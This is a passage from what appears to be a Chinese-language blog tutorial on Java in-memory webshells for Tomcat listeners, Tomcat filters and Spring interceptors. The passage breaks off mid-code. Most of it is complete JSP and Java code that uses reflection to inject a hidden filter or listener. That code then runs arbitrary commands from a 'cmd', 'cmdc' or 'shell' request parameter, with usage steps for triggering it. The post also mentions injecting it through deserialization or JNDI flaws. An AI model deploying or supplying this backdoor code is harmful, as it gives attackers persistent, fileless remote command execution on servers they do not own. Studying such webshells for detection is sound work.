function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;shell&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;shell&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line"><span class="type">S</span> <span class="variable">servletRequestListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="built_in">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a parameter of <span class="string">&quot;shell&quot;</span> --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220620150400.png"></p>
<p>可以看到请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行</p>
<p>自定义一个filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zzddhmt7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter初始化创建....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">                         FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进行过滤操作......&quot;</span>);</span><br><span class="line">        <span class="comment">// 放行</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在web.xml中注册filter，这里我设置url-pattern为 &#x2F;demo 即访问 &#x2F;demo 才会触发</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.filterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问<code>http://localhost:8080/demo</code> ，就可以发现成功触发</p>
<p>Filter的整个流程：</p>
<ul>
<li>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</li>
<li>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</li>
<li>找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</li>
<li>FilterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</li>
</ul>
<p>整个过程类似CC链分析中的map</p>
<p>其中的一些类如下：</p>
<p><code>FilterDefs</code>：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p>
<p><code>FilterConfigs</code>：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</p>
<p><code>FilterMaps</code>：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern。对应了web.xml中配置的<filter-mapping>，里面代表了各个filter之间的调用顺序</p>
<p><code>FilterChain</code>：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</p>
<p><code>WebXml</code>：存放 web.xml 中内容的类</p>
<p><code>ContextConfig</code>：Web应用的上下文配置类</p>
<p><code>StandardContext</code>：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</p>
<p><code>StandardWrapperValve</code>：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</p>
<h3 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h3><p>过程：</p>
<ul>
<li>创建恶意filter</li>
<li>用filterDef对filter进行封装</li>
<li>将filterDef添加到filterDefs跟filterConfigs中</li>
<li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中。要注意的是，因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去</li>
<li>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启</li>
</ul>
<p>访问下面这个jsp，注入成功后，用?cmd&#x3D;即可命令执行（该方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>适用更多版本的实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;!-- <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span></span><br><span class="line"><span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> revise the <span class="keyword">import</span> <span class="keyword">class</span> <span class="title class_">with</span> correct tomcat version --&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span> request <span class="built_in">this</span> jsp file --&gt;</span><br><span class="line">&lt;!-- <span class="number">3</span> request xxxx/<span class="built_in">this</span> file/../abcd?cmdc=calc --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DefaultFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdc&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmdc&quot;</span>));</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;exec done&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">                </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;DefaultFilter&quot;</span>;</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); </span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="type">DefaultFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFilter</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/abcd&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">    out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">&quot;Injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="interceptor型"><a href="#interceptor型" class="headerlink" title="interceptor型"></a>interceptor型</h2><p>这种类型的场景：最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们 webshell 逻辑的处理。在 tomcat 容器下，有 filter、listener 等技术可以达到上述要求。那么在 spring 框架层面下，就考虑Interceptor 拦截了</p>
<h3 id="获得当前代码运行时的上下文环境"><a href="#获得当前代码运行时的上下文环境" class="headerlink" title="获得当前代码运行时的上下文环境"></a>获得当前代码运行时的上下文环境</h3><p>参考<a href="https://landgrey.me/blog/12/#top">基于内存 Webshell 的无文件攻击技术研究</a>中的方法  </p>
<h3 id="获取-adaptedInterceptors-属性值"><a href="#获取-adaptedInterceptors-属性值" class="headerlink" title="获取 adaptedInterceptors 属性值"></a>获取 adaptedInterceptors 属性值</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br></pre></td></tr></table></figure>

<h3 id="恶意Interceptor类"><a href="#恶意Interceptor类" class="headerlink" title="恶意Interceptor类"></a>恶意Interceptor类</h3><p>结合漏洞（如反序列化、JNDI注入等）注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//package bitterz.interceptors;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class="line">        <span class="comment">// 避免重复添加</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> adaptedInterceptors.size() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adaptedInterceptors.get(i) <span class="keyword">instanceof</span> TestInterceptor) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已经添加过TestInterceptor实例了&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TestInterceptor</span> <span class="variable">aaa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestInterceptor</span>(<span class="string">&quot;aaa&quot;</span>);  <span class="comment">// 避免进入实例创建的死循环</span></span><br><span class="line">        adaptedInterceptors.add(aaa);  <span class="comment">//  添加全局interceptor</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TestInterceptor</span><span class="params">(String aaa)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   